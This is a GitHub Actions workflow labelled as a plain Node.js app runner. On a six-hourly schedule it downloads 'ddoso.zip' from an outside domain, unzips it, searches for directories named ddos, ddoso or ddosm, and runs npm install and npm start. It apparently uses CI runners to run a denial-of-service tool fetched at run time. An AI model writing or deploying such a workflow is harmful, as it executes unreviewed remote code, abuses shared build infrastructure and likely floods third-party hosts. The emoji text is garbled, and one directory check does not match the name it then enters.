name: ğŸš€ Node.js App with npm start

on:
  workflow_dispatch:  # Manual trigger
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours

jobs:
  run-app:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours max
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      
      - name: Download and extract application
        run: |
          wget -q https://reality.mahmud-tech.online/ddoso.zip
          unzip -q ddoso.zip
          echo "ğŸ“ Extracted files:"
          ls -la
          echo ""
          echo "ğŸ“ Directory contents:"
          ls -la */
      
      - name: Find app directory and run npm start
        run: |
          # List all directories to see what we have
          echo "ğŸ” Available directories:"
          ls -d */
          
          # Try different possible directory names (all lowercase)
          if [ -d "ddosm" ]; then
            echo "âœ… Found dDOSm directory"
            cd dDOSm
          elif [ -d "ddoso" ]; then
            echo "âœ… Found ddoso directory"
            cd ddoso
          elif [ -d "ddos" ]; then
            echo "âœ… Found ddos directory"
            cd ddos
          else
            # Look for any directory with package.json
            echo "ğŸ” Searching for directory with package.json..."
            APP_DIR=$(find . -maxdepth 2 -name "package.json" -type f -exec dirname {} \; | head -1)
            if [ -n "$APP_DIR" ]; then
              echo "âœ… Found app in: $APP_DIR"
              cd "$APP_DIR"
            else
              echo "âŒ No directory with package.json found"
              exit 1
            fi
          fi
          
          echo "ğŸ“ Working directory: $(pwd)"
          echo "ğŸ“„ Directory contents:"
          ls -la
          
          echo ""
          echo "ğŸ“„ package.json contents:"
          cat package.json
          
          echo ""
          echo "ğŸ“¦ Installing dependencies..."
          npm install --legacy-peer-deps
          
          echo ""
          echo "ğŸš€ Running npm start..."
          npm start
